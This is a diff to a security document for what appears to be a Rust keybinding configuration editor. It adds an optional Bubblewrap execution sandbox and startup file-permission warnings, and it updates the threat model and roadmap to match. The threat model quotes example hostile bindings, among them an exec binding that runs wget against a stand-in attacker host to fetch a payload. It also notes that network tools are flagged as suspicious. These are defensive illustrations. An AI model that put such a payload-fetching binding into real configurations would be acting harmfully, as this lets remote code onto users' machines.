@@ -12,7 +12,7 @@ This document outlines the security architecture, threat model, supported versio
 - [Overview](#overview)
 - [Supported Versions](#supported-versions)
 - [Security Architecture](#security-architecture)
-  - [Three-Layer Defence System](#three-layer-defence-system)
+  - [Four-Layer Defence System](#four-layer-defence-system)
 - [Threat Model](#threat-model)
   - [Threats Mitigated ✅](#threats-mitigated-)
   - [Threats NOT Fully Mitigated ⚠️](#threats-not-fully-mitigated-️)
@@ -22,6 +22,7 @@ This document outlines the security architecture, threat model, supported versio
   - [3. Shannon Entropy Detection](#3-shannon-entropy-detection)
   - [4. Atomic File Operations](#4-atomic-file-operations)
   - [5. Automatic Backup System](#5-automatic-backup-system)
+  - [6. Permission Verification Warnings](#6-permission-verification-warnings)
 - [Memory Safety](#memory-safety)
   - [100% Safe Rust](#100-safe-rust)
   - [Protections Provided](#protections-provided)
@@ -49,7 +50,7 @@ This document outlines the security architecture, threat model, supported versio
 
 ## Security Architecture
 
-### Three-Layer Defence System
+### Four-Layer Defence System
 
 ```mermaid
 %%{init: {'flowchart': {'subGraphTitleMargin': {'top': 10, 'bottom': 20}}}}%%
@@ -76,11 +77,18 @@ graph TB
         TransactionGuard[Transaction Integration]
     end
 
+    subgraph Layer4 [Layer 4: Optional Execution Sandbox]
+        Bubblewrap[Bubblewrap Wrapper<br/>No network access]
+        ExecOnly[Applied to exec bindings only]
+    end
+
     Input --> Layer1
     Layer1 --> Layer2
     Layer2 --> Layer3
     Layer3 --> Decision{Valid?}
-    Decision -->|Yes| Accept[✅ Execute/Save]
+    Decision -->|Yes, sandbox on| Layer4
+    Decision -->|Yes, sandbox off| Accept[✅ Execute/Save]
+    Layer4 --> Accept
     Decision -->|No| Reject[❌ Block + Error Message]
 
     style Layer1 fill:#ffe1e1,color:#000
@@ -118,6 +126,13 @@ User Input (Key Combo, Dispatcher, Args)
 │  ✓ Unified validation report                │
 │  ✓ Severity classification (Error/Warn)     │
 │  ✓ Transaction integration                  │
+└────────────────┬────────────────────────────┘
+                 ↓
+┌─────────────────────────────────────────────┐
+│  Layer 4: Optional Execution Sandbox        │
+│  ✓ Bubblewrap wrapper for exec bindings     │
+│  ✓ No network access inside sandbox         │
+│  ✓ Enabled per binding from the edit dialog │
 └────────────────┬────────────────────────────┘
                  ↓
          ┌───────┴────────┐
@@ -201,9 +216,9 @@ Thread 2: Modify file between validate and write
 bind = SUPER, K, exec, firefox
 # Executes /malicious/path/firefox instead of /usr/bin/firefox
 ```
-**Status**: Application cannot sandbox execution environment.
-**Mitigation Strategy**: Validate dispatcher names, but not execution context.
-**Residual Risk**: User's compromised environment affects all executed commands.
+**Status**: Partially mitigated.
+**Mitigation Strategy**: `exec` bindings can be wrapped in Bubblewrap from the UI, which removes network access and exposes the system via read-only binds.
+**Residual Risk**: The sandbox does not resolve PATH to absolute binaries, and non-`exec` dispatchers are unaffected.
 
 #### 4. Network-Based Attacks
 **Scenario**: Valid commands that download malicious payloads.
@@ -211,8 +226,8 @@ bind = SUPER, K, exec, firefox
 bind = SUPER, K, exec, wget http://attacker.com/payload
 ```
 **Status**: `wget`, `curl` are valid tools, often used legitimately.
-**Mitigation Strategy**: Layer 2 flags network tools as suspicious.
-**Residual Risk**: User can dismiss warnings.
+**Mitigation Strategy**: Layer 2 flags network tools as suspicious, and Bubblewrap sandboxing removes network access when enabled for `exec` bindings.
+**Residual Risk**: Users can still save unsandboxed bindings, and the sandbox is opt-in rather than mandatory.
 
 ---
 
@@ -305,6 +320,15 @@ fn shannon_entropy(data: &str) -> f64 {
 ```
 
 **Retention**: User-configurable (default: keep all backups).
+
+### 6. Permission Verification Warnings
+
+On startup, the application checks the target config file and warns when:
+- The file is world-readable
+- The file is world-writable
+- The file owner differs from the current user (Linux `/proc/self` check)
+
+**Behaviour**: Warnings are informational. The application still opens the config so advanced setups like shared mounts and symlinks are not blocked outright.
 
 ---
 
@@ -437,12 +461,12 @@ cargo build --release
 
 ## Future Security Enhancements
 
-### Planned (Layer 4: Execution Sandbox)
+### Planned
 
-1. **Sandboxed Execution** (High Priority)
-   - Bubblewrap integration for command isolation
-   - Restrict filesystem/network access per binding
-   - Configurable security profiles
+1. **Sandbox Profiles** (Medium Priority)
+   - Expand Bubblewrap with selectable security profiles
+   - Restrict filesystem access more aggressively per binding type
+   - Add clearer UI explanations for sandbox trade-offs
 
 2. **AppArmor/SELinux Profiles** (Medium Priority)
    - System-level mandatory access control
@@ -457,10 +481,6 @@ cargo build --release
    - Sign backups with ed25519
    - Verify backup integrity on restore
    - Detect tampering
-
-5. **Permission Verification** (Low Priority)
-   - Check config ownership on startup
-   - Warn if world-readable or owned by another user
 
 ---
 
